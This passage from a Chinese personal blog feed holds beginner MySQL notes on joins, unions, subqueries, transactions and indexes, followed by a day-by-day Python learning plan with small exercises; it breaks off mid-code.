SELECT DISTINCT prof<br>        FROM teacher<br>        WHERE<br>            depart like &quot;电子%&quot;<br>    );<br></code></pre></td></tr></table></figure><h3 id="查询多张表的类似元素"><a href="#查询多张表的类似元素" class="headerlink" title="查询多张表的类似元素"></a>查询多张表的类似元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询所有学生和老师的的name sex birthday<br>SELECT<br>    sname as name,<br>    ssex as sex,<br>    sbirthday as birthday<br>from student<br>UNION<br>SELECT<br>    tname,<br>    tsex,<br>    tbirthday # 后面可以不起别名<br>FROM teacher;<br><br><br># 查询所有女老师和女学生的name  asex  birthday<br><br>SELECT<br>    sname as name,<br>    ssex as sex,<br>    sbirthday as birthday<br>FROM student<br>WHERE student.ssex = &quot;女&quot;<br>UNION<br>SELECT tname, tsex, tbirthday<br>FROM teacher<br>WHERE tsex = &quot;女&quot;;<br></code></pre></td></tr></table></figure><h2 id="复制表数据做查询语句"><a href="#复制表数据做查询语句" class="headerlink" title="复制表数据做查询语句"></a>复制表数据做查询语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询成绩比平均成绩低的同学的学号、姓名、成绩<br><br>SELECT cno,AVG(degree) FROM score GROUP BY cno;<br><br># 可以求出平均数<br><br>SELECT * FROM score;<br><br># 可以找出所有的信息<br><br>SELECT *<br>FROM score a<br>WHERE degree &lt; (<br>        SELECT AVG(degree)<br>        FROM score b<br>        WHERE a.cno = b.cno<br>    );<br></code></pre></td></tr></table></figure><h2 id="year"><a href="#year" class="headerlink" title="year()"></a>year()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 查询student 的年龄 和姓名<br><br># 注意年龄需要  现在的日期-出生日期<br><br>select sname,YEAR(NOW())-YEAR(sbirthday) from student;<br><br></code></pre></td></tr></table></figure><h2 id="sql连接查询"><a href="#sql连接查询" class="headerlink" title="sql连接查询"></a>sql连接查询</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/mysql/fristLearn/image-20231101093311153.png" alt="image-20231101093311153"></p><p><strong>数据准备</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE table person( id INT, name VARCHAR(20),cardId int);<br><br>CREATE TABLE card( id INT, name VARCHAR(20) );<br><br>SHOW TABLES;<br><br>INSERT INTO card(id, name)<br>VALUES (1, &#x27;饭卡&#x27;), (2, &#x27;建行卡&#x27;), (3, &#x27;农行卡&#x27;), (4, &#x27;工商卡&#x27;), (5, &#x27;邮政卡&#x27;);<br><br>SELECT * FROM card;<br><br>INSERT INTO<br>    person(id, name, `cardId`)<br>VALUES (1, &#x27;张三&#x27;, 1), (2, &#x27;李四&#x27;, 3), (3, &#x27;王五&#x27;, 6);<br><br>SELECT * FROM person;<br><br>-- 这里没有创建外键<br>-- 而且person里面的有一个card并不存在于caard表中<br></code></pre></td></tr></table></figure><h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><blockquote><p>查询的是多个表中有关系的数据</p></blockquote><ol><li>inner join</li><li>join</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM card INNER JOIN person ON person.cardId=card.id;<br></code></pre></td></tr></table></figure><h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><h4 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h4><ol><li>left join</li><li>left outer join</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 左连接<br><br>-- 会把左边的表全部数据取出来，右边的表有就查询出来，没有的话就NULL<br><br>SELECT * FROM person LEFT JOIN card ON person.`cardId`=card.id;<br></code></pre></td></tr></table></figure><h4 id="右链接"><a href="#右链接" class="headerlink" title="右链接"></a>右链接</h4><ol><li>right join</li><li>right outer join</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 右连接<br><br>-- 会把右边的表 全部数据取出来，左边的表有就查询没有的话就为NULL<br><br>SELECT * FROM person RIGHT JOIN card ON person.`cardId`=card.id;<br></code></pre></td></tr></table></figure><h4 id="完全外连接"><a href="#完全外连接" class="headerlink" title="完全外连接"></a>完全外连接</h4><ol><li>full join</li><li>full outer join</li></ol><p>但是mysql不支持full 连接的方式，但是额可以使用union 左右连接发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/mysql/fristLearn/image-20231101093619444.png" alt="image-20231101093619444"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>FROM person<br>    RIGHT JOIN card ON person.`cardId` = card.id<br>UNION<br>SELECT *<br>FROM person<br>    LEFT JOIN card ON person.`cardId` = card.id;<br></code></pre></td></tr></table></figure><h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><blockquote><p>保证一个业务的完整性</p><p>多条sql语句同时进行，不允许失败</p></blockquote><ol><li><p>事务是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select @@autocommot;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/mysql/fristLearn/image-20231101094236099.png" alt="image-20231101094236099"></p><p>1 则为开启（默认)</p></li><li><p>事务开启的作用</p><p>我们执行一条sql语句的时候会立马知道结果，而且不能回滚（不能撤销）</p></li><li><p>如何控制事务？</p><ul><li>默认开启事务</li><li>rollback;语句是回滚</li></ul></li></ol><h1 id="索引和视图"><a href="#索引和视图" class="headerlink" title="索引和视图"></a>索引和视图</h1><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="主键索引"><a href="#主键索引" class="headerlink" title="主键索引"></a>主键索引</h3><ol><li><p>就是使用主键排序放置的</p></li><li><p>查找思想就是</p><ul><li><p>每四条数据为一页</p><p>第一页和左后一页是5条数据，因为最大值和最小值</p><p>通过单向链表连接</p></li><li><p>每一页数据中最大的数据被称为槽</p><p>槽的遍历是二分查找法实现</p></li></ul></li></ol><h3 id="B-树索引（普通索引，二级索引）"><a href="#B-树索引（普通索引，二级索引）" class="headerlink" title="B+树索引（普通索引，二级索引）"></a>B+树索引（普通索引，二级索引）</h3><ol><li><p>将槽变为数据页</p></li><li><p>多级目录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/mysql/fristLearn/image-20231104211144308.png" alt="image-20231104211144308"></p></li></ol><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><ol><li><p>创建视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">    <br></code></pre></td></tr></table></figure></li></ol><h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><p>就是一个变成过程</p><p>sql脚本可以编译为：存储过程，函数，触发器</p>]]></content>
    
    
    
    <tags>
      
      <tag>MYSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习计划</title>
    <link href="/2023/09/21/python/python%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    <url>/2023/09/21/python/python%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h1 id="23-9-22"><a href="#23-9-22" class="headerlink" title="23_9_22"></a>23_9_22</h1><p>python版本推荐3.8和2,7最好都安装<br>用着挺方便的，反正不要太新了</p><ul><li><p><input checked="" disabled="" type="checkbox"> 搭建vscode环境</p><p><a href="https://zhuanlan.zhihu.com/p/165379391">https://zhuanlan.zhihu.com/p/165379391</a></p><p>我的文件结构<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921234737043.png" alt="image-20230921234737043"></p><p>假如我想使用python<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921235028643.png" alt="image-20230921235028643"></p><p>单独打开code就可以了</p><p>我是则会么做的，防止了不同环境的混用，乱</p></li><li><p><input checked="" disabled="" type="checkbox"> 安装ipython</p><p>相比于命令行还是好用很多，这个是睿那里偷的</p><p>不知道你有没有，反正我把我知道推荐给你</p><p><a href="https://blog.csdn.net/weixin_39526564/article/details/113627531">https://blog.csdn.net/weixin_39526564/article/details/113627531</a></p></li></ul><hr><h1 id="23-9-23"><a href="#23-9-23" class="headerlink" title="23_9_23"></a>23_9_23</h1><p>语言学习</p><ul><li><p><input checked="" disabled="" type="checkbox"> 尝试以下代码</p><p>ipython</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> this<br></code></pre></td></tr></table></figure><p>我反正是看不懂英语</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> turtle<br><br>turtle.pensize(<span class="hljs-number">4</span>)<br>turtle.pencolor(<span class="hljs-string">&#x27;red&#x27;</span>)<br><br>turtle.forward(<span class="hljs-number">100</span>)<br>turtle.right(<span class="hljs-number">90</span>)<br>turtle.forward(<span class="hljs-number">100</span>)<br>turtle.right(<span class="hljs-number">90</span>)<br>turtle.forward(<span class="hljs-number">100</span>)<br>turtle.right(<span class="hljs-number">90</span>)<br>turtle.forward(<span class="hljs-number">100</span>)<br><br>turtle.mainloop()<br></code></pre></td></tr></table></figure><p>挺有趣的，挺强大的</p></li><li><p><input checked="" disabled="" type="checkbox"> 了解变量的命名</p><blockquote><p>回答问题</p><ol><li>__实例属性用单个下划线开头</li><li>__实例属性用两个下划线开头</li></ol></blockquote></li><li><p><input checked="" disabled="" type="checkbox"> 类型与检查</p><p>Python中可以使用<code>type</code>函数对变量的类型进行检查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">100</span><br>b = <span class="hljs-number">12.345</span><br>c = <span class="hljs-number">1</span> + <span class="hljs-number">5j</span><br>d = <span class="hljs-string">&#x27;hello, world&#x27;</span><br>e = <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))    <span class="hljs-comment"># &lt;class &#x27;int&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(b))    <span class="hljs-comment"># &lt;class &#x27;float&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(c))    <span class="hljs-comment"># &lt;class &#x27;complex&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(d))    <span class="hljs-comment"># &lt;class &#x27;str&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(e))    <span class="hljs-comment"># &lt;class &#x27;bool&#x27;&gt;</span><br><br><br></code></pre></td></tr></table></figure></li><li><p><input checked="" disabled="" type="checkbox"> 如何经行类型转换？</p></li><li><p><input checked="" disabled="" type="checkbox"> 运算符</p><ul><li><input checked="" disabled="" type="checkbox"> 取下标：</li><li><input checked="" disabled="" type="checkbox"> 切片：</li><li><input checked="" disabled="" type="checkbox"> 按位取反, 正负号：</li><li><input checked="" disabled="" type="checkbox"> 乘，除，模，整除：</li><li><input checked="" disabled="" type="checkbox"> 加，减：</li><li><input checked="" disabled="" type="checkbox"> 右移，左移：</li><li><input checked="" disabled="" type="checkbox"> 按位与：</li><li><input checked="" disabled="" type="checkbox"> 按位异或，按位或：</li><li><input checked="" disabled="" type="checkbox"> 小于等于，小于，大于，大于等于：</li><li><input checked="" disabled="" type="checkbox"> 等于，不等于：</li><li><input checked="" disabled="" type="checkbox"> 身份运算符：</li><li><input checked="" disabled="" type="checkbox"> 成员运算符：</li><li><input checked="" disabled="" type="checkbox"> 逻辑运算符：</li></ul></li><li><p><input checked="" disabled="" type="checkbox"> 项目</p><p>虽然看起来很简单，但是还是做一下</p><ul><li><input checked="" disabled="" type="checkbox"> 输入半径计算圆的面积</li></ul></li></ul><h1 id="23-9-24"><a href="#23-9-24" class="headerlink" title="23_9_24"></a>23_9_24</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 复习</p><ul><li><input checked="" disabled="" type="checkbox"> 找出一段(1000-…)时间的闰年</li><li><input checked="" disabled="" type="checkbox"> 二分查找循序表</li></ul></li><li><p><input checked="" disabled="" type="checkbox"> if-else</p></li><li><p><input checked="" disabled="" type="checkbox"> 项目</p><ul><li><p><input checked="" disabled="" type="checkbox"> 将成绩换成等级</p><blockquote><p>如果输入的成绩在90分以上（含90分）输出A；80分-90分（不含90分）输出B；70分-80分（不含80分）输出C；60分-70分（不含70分）输出D；60分以下输出E。</p></blockquote></li></ul></li></ul><h1 id="23-9-27"><a href="#23-9-27" class="headerlink" title="23_9_27"></a>23_9_27</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 生成<strong>斐波那契数列</strong>的前20个数。</p><p>尝试使用递归和循环分别构造</p><p>尝试定义函数函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__mian__&#x27;</span> <span class="hljs-comment">#理解为主函数</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">function_name</span> <span class="hljs-comment">#注意命名规范</span><br></code></pre></td></tr></table></figure><p>这个我还没写，可以等我写了，你在做</p></li></ul><h1 id="23-9-28"><a href="#23-9-28" class="headerlink" title="23_9_28"></a>23_9_28</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 尝试使用可变参数函数写一个加法器</p><p>关键词:<code>*args</code></p></li><li><p><input checked="" disabled="" type="checkbox"> 使用model</p><p>可以理解为C语言的头文件</p></li><li><p><input checked="" disabled="" type="checkbox"> 写一个两个model里面有两个func(*args)的程序</p><p>第一个func为减法</p><p>第二个func为加法</p></li></ul><h1 id="23-10-5"><a href="#23-10-5" class="headerlink" title="23_10_5"></a>23_10_5</h1><p>抱歉，因为我的问题，把你的学习时间拉长了</p><ul><li><input checked="" disabled="" type="checkbox"> 原谅（哈哈哈哈）</li><li><input checked="" disabled="" type="checkbox"> 判断是不是回文数</li><li><input checked="" disabled="" type="checkbox"> 判断是不是素数</li></ul><h1 id="23-10-6"><a href="#23-10-6" class="headerlink" title="23_10_6"></a>23_10_6</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 使用这行的字符串打印静夜诗（意思一下就行，重点再折行也就是使用<code>&quot;&quot;&quot;</code>）</p></li><li><p><input checked="" disabled="" type="checkbox"> 学习使用<code>\</code>表示8进制和16进制</p><p><code>\u</code>八进制</p><p><code>\x</code>十六进制</p></li><li><p><input checked="" disabled="" type="checkbox"> 学习字符串的相关符号</p><ul><li></li></ul><ul><li></li></ul><p>in</p><p>not in</p><p>[]</p><p>[:]</p></li><li><p><input checked="" disabled="" type="checkbox"> 学习字符串的操作</p><ol><li>计算长度</li><li>获得&#x3D;&#x3D;全部大写&#x3D;&#x3D;的拷贝</li><li>查找，返回下标</li><li>是否是数字构成</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">len</span>()<br>upper()<br>find()<br>isdigit()<br><br></code></pre></td></tr></table></figure></li><li><p><input checked="" disabled="" type="checkbox"> 格式化字符串</p></li></ul><h1 id="23-10-7"><a href="#23-10-7" class="headerlink" title="23_10_7"></a>23_10_7</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 使用列表</p><blockquote><p>定义列表可以将列表的元素放在<code>[]</code></p><p>list1 &#x3D; [1, 3, 5, 7, 100]</p><p>看一个比较东西：</p><p>list1&#x3D;[‘hello’]</p><p>list2&#x3D;list1*3</p><p>print(list2) # [‘hello’, ‘hello’, ‘hello’]</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">下标(索引)运算<br><br><span class="hljs-built_in">print</span>(list1[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 1</span><br><span class="hljs-built_in">print</span>(list1[<span class="hljs-number">4</span>]) <span class="hljs-comment"># 100</span><br><br><br><span class="hljs-comment"># range 循环</span><br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(list1)):<br>    <span class="hljs-built_in">print</span>(list1[index])<br>    <br>    <br><span class="hljs-comment"># 通过for循环遍历列表元素</span><br><span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-built_in">print</span>(elem)<br>    <br>    <br><span class="hljs-comment"># 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值</span><br><span class="hljs-keyword">for</span> index, elem <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(list1):<br>    <span class="hljs-built_in">print</span>(index, elem)<br>    <br>    <br><span class="hljs-comment"># 添加元素</span><br>list1.append(<span class="hljs-number">200</span>)<br>list1.insert(<span class="hljs-number">1</span>, <span class="hljs-number">400</span>)<br><br><br><span class="hljs-comment"># 从指定的位置删除元素</span><br>list1.pop(<span class="hljs-number">0</span>)<br>list1.pop(<span class="hljs-built_in">len</span>(list1) - <span class="hljs-number">1</span>)<br><br><br><br><span class="hljs-comment"># 清空列表元素</span><br>list1.clear()<br><br><br><span class="hljs-comment"># 列表切片</span><br>fruits2 = fruits[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>可以尝试其他的东西，我觉得用的多的就是这些</p></li></ul><h1 id="23-10-8"><a href="#23-10-8" class="headerlink" title="23_10_8"></a>23_10_8</h1><p>今天学习一下生成器</p><ul><li><p><input checked="" disabled="" type="checkbox"> 生成器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">f = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]<br>f = [x + y <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDE&#x27;</span> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;1234567&#x27;</span>]<br></code></pre></td></tr></table></figure></li></ul><h1 id="23-10-12"><a href="#23-10-12" class="headerlink" title="23_10_12"></a>23_10_12</h1><p>一不小心都这么久没给你布置任务了….</p><p>再次道歉</p><p>今天学习元组+项目练手</p><ul><li><p><input checked="" disabled="" type="checkbox"> 跑马灯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br>string = <span class="hljs-string">&quot;四川成都欢迎你!&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    os.system(<span class="hljs-string">&quot;cls&quot;</span>)<br>    <span class="hljs-built_in">print</span>(string)<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    string = string[<span class="hljs-number">1</span>:] + string[<span class="hljs-number">0</span>]<br><br></code></pre></td></tr></table></figure></li><li><p><input checked="" disabled="" type="checkbox"> 生成指定的长度的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>passwd_len = <span class="hljs-number">10</span><br>all_chars = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>passwd = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(passwd_len):<br>    index = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(all_chars) - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 想想为什么减一嘞</span><br>    passwd += <span class="hljs-built_in">str</span>(all_chars[index])<br><br><span class="hljs-built_in">print</span>(passwd)<br><br></code></pre></td></tr></table></figure></li><li><p><input checked="" disabled="" type="checkbox"> 元组</p><blockquote><p>元组与列表类似</p><p>不同之处在于元组的元素不能修改</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义元组</span><br>t = (<span class="hljs-string">&#x27;wx&#x27;</span>,<span class="hljs-string">&#x27;四川成都&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># 除了1，2有意思其他的没有哈哈哈</span><br></code></pre></td></tr></table></figure><ul><li><p>获取元组的值</p></li><li><p>便于元组</p></li><li><p>转换成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>()<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="23-10-13"><a href="#23-10-13" class="headerlink" title="23_10_13"></a>23_10_13</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 完成下面这个</p><blockquote><p>这个是一道经典算法</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">《幸运的基督徒》</span><br><span class="hljs-string">有15个基督徒和15个非基督徒在海上遇险，为了能让一部分人活下来不得不将其中15个人扔到海里面去，有个人想了个办法就是大家围成一个圈，由某个人开始从1报数，报到9的人就扔到海里面，他后面的人接着从1开始报数，报到9的人继续扔到海里面，直到扔掉15个人。由于上帝的保佑，15个基督徒都幸免于难，问这些人最开始是怎么站的，哪些位置是基督徒哪些位置是非基督徒。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="23-10-15"><a href="#23-10-15" class="headerlink" title="23_10_15"></a>23_10_15</h1><ul><li><p><input checked="" disabled="" type="checkbox"> 开始学习面向对象</p><blockquote><p> 经过java的学习，你应该知道什么是面向对象，所以对思想我就不再细说了，开始尝试学习在python运用这种思想</p></blockquote><p>直接看这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 类名大写</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-comment"># 构造函数，可以理解为构造器</span><br>    <span class="hljs-comment"># name,age作为成员变量</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sno</span>):<br>        self.name = name  <span class="hljs-comment"># 理解尾public</span><br>        self.__age = age  <span class="hljs-comment"># 理解为private</span><br>        self.__sno = sno  <span class="hljs-comment"># 理解为private</span><br><br>        <span class="hljs-comment"># 由于python没有私有这一说，添加_只是一种较为合理的代码风格,表面是私有，我们通过方法却能访问</span><br><br>    <span class="hljs-comment"># 我喜欢驼峰命名法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.name<br><br>    <span class="hljs-comment"># 貌似这种命名python更加喜欢</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_name</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br><br><span class="hljs-comment"># 类的实例化</span><br>wx = Student(<span class="hljs-string">&quot;wx&quot;</span>, <span class="hljs-number">19</span>, <span class="hljs-string">&quot;2022125008&quot;</span>)<br><br><span class="hljs-built_in">print</span>(wx.getName())<br><span class="hljs-built_in">print</span>(wx.name)<br>wx.set_name(<span class="hljs-string">&quot;wen&quot;</span>)<br><span class="hljs-built_in">print</span>(wx.getName())<br><br><span class="hljs-built_in">print</span>(wx.getAge())<br><span class="hljs-comment"># 访问age私有变量</span><br><span class="hljs-built_in">print</span>(wx._Student__age)<br></code></pre></td></tr></table></figure></li><li><p><input checked="" disabled="" type="checkbox"> 练习定义点(Point)类</p><p>成员：x,y</p><p>方法：set,get</p></li></ul><h1 id="23-10-16"><a href="#23-10-16" class="headerlink" title="23_10_16"></a>23_10_16</h1><p>最近应该都是代码演示有问题提出来</p><ul><li><p><input disabled="" type="checkbox"> 装饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 